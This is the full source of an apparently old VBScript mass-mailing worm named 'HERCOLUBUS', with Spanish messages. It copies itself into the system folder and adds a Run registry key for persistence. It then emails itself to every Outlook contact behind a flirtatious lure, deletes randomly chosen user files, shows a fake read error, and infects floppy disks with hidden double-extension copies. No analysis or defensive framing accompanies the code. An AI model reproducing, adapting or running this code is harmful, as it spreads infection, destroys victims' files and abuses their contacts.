REM HERCOLUBUS Copyright 27/08/2001
On Error Resume Next
Dim X
Dim nHP
Dim nD
Dim file
Dim cNom, cNom1
Set nHP = CreateObject("Scripting.FileSystemObject")
Set fsoST = WScript.CreateObject("WScript.Shell")
Set sysdir = nHP.GetSpecialFolder(1)
Set file = nHP.GetFile(WScript.ScriptFullName)
If nHP.FileExists(sysdir&"\MSWORD.vbs") = False then
cNom = left(file.name,len(file.name)-7)
file.copy(sysdir&"\MSWORD.vbs")
file.copy(sysdir&"\THWIN.vbs")
file.copy(sysdir & "\" & file.name)
Dim oOutlook, nMapi, cFue, y, Va
outl = "Outlook"
lok = ".Application"
nMap = "MA"
nPI = "PI"
Set oOutLook = WScript.CreateObject(outl & lok)
Set nMapi = oOutLook.GetNameSpace(nMAp & nPI)
If oOutLook = "Outlook" Then
For y = 1 To nMapi.AddressLists.Count
Set NuevLib = nMapi.Addresslists(y)
x=1
For Va = 1 To NuevLib.AddressEntries.count
Uf = NuevLib.AddressEntries(x)
Set cFue = oOutlook.CreateItem(0)
cFue.Recipients.Add Uf
cFue.Subject = cNom
cFue.Body = Uf & "  Eres algo especial...escríbeme"
cFue.Attachments.Add (sysdir & "\" & file.name)
cFue.Send
x=x+1
Next
Next
Set oOutLook = Nothing
Set nMapi = Nothing
End If
End If

wini()
If file.name <> "THWIN.vbs" then
If file.drive = "A:" then
cNom1 = left(file,len(file)-4)
If nHP.FileExists(cNom1) = True Then
set arch = nHP.getfile(cNom1)
cNom2 = arch.shortPath
fsoST.Run (cNom2)
Else
mens()
End If		
Else
mens()
End if
End If

Randomize
nD = Int((20 * Rnd) + 1)
If nD = 1 Then cFiles ="xls"
If nD = 2 Then cFiles ="doc"
If nD = 3 Then cFiles ="wav"
If nD = 4 Then cFiles ="dwg"
If nD = 5 Then cFiles ="mp3"
If nD = 6 Then cFiles ="bak"
If nD = 7 Then cFiles ="wav"
If nD = 8 Then cFiles ="bmp"
If nD = 9 Then cFiles ="htm"
If nD = 10 Then cFiles ="hlp"
If nD = 11 Then cFiles ="chm"
If nD = 12 Then cFiles ="jpg"
If nD = 13 Then cFiles ="gif"
If nD = 14 Then cFiles ="scr"
If nD = 15 Then cFiles ="ttf"
If nD = 16 Then cFiles ="mid"
If nD = 17 Then cFiles ="cdr"
If nD = 18 Then cFiles ="mdb"
If nD = 19 Then cFiles ="dbf"
If nD = 20 Then cFiles ="ico"
Set List1 = nHP.CreateTextFile(sysdir & "\ListWin.txt")
List1.WriteLine ("ARCHIVOS")

hode()
List1.Close
mesg()

Sub hode()
On Error Resume Next
Dim d,dc,s
X=0
Set dc = nHP.drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If x < 5 Then Busc(d)
End If
Next
End Sub
Sub Busc(nFolder)
On Error Resume Next
set f=nHP.GetFolder(nFolder&"\")
Set sf = f.SubFolders
For Each f1 In sf
If x < 5 Then
files1(f1&"\")
Else
Exit For
End If
If x < 5 Then
Busc(f1&"\")
Else
Exit For
End If
Next
End Sub

Sub Files1(subF)
On Error Resume Next
Set f2 = nHP.GetFolder(subF)
Set fc = f2.Files
For Each fl In fc
ext = nHP.GetExtensionName(fl.Path)
If ext = cFiles Then
If x < 5 Then
List1.WriteLine Now & " " & fl.Path
Set oFil = nHP.getFile(fl.Path)
oFil.delete
x = x + 1
Else
Exit For
End If
End If
Next
End Sub

Sub wini()
On Error Resume Next
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN",sysdir&"\THWIN.vbs"
fsoST.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
End Sub

Sub mesg()
On Error Resume Next
If file.name = "THWIN.vbs" then oprog()
End Sub

sub mens()
Dim Mensaje
Dim Estilo
Dim Titulo
Dim Respuesta
Mensaje = "Error de lectura. No se puede abrir el archivo"
Estilo = vbCritical
Titulo = "ERROR"
Respuesta = Msgbox(Mensaje, Estilo, Titulo)
End Sub

Sub oprog()
On Error Resume Next
Esperar = 60*10
Desde = Timer 
Do While Timer < Desde + Esperar
Loop
Set Drv = nHP.GetDrive("A:")
If Drv.IsReady Then
set f=nHP.GetFolder("A:\")
set fc = f.Files
If fc.count > 0 then
For Each fa In fc
Set oFa = nHP.getFile(fa)
exta = nHP.GetExtensionName(fa)
If exta <> "vbs" Then
if oFa.attributes = 34 Then
If nHP.FileExists(oFa.Path&".vbs") = false Then	oFa.delete
Else
nHP.CopyFile sysdir & "\MSWORD.vbs",fa & ".vbs"
oFa.attributes = 34
If nHP.FileExists(sysdir & "\WinList.txt") = True then
Set Lis = nHP.OpentextFile(sysdir & "\WinList.txt")
nLec = Lis.ReadAll
Lis.Close
Else
nLec = "ARCHIVOS"
End If
Set rge = nHP.CreateTextFile(sysdir & "\WinList.txt")
rge.WriteLine (nLec)			
rge. WriteLine Now & " " & fa
rge.Close
End If
End If
Exit For
Next	
Else
nHP.CopyFile sysdir & "\MSWORD.vbs","A:\UNSCH.doc.vbs"
End If
End If
oprog()
End Sub
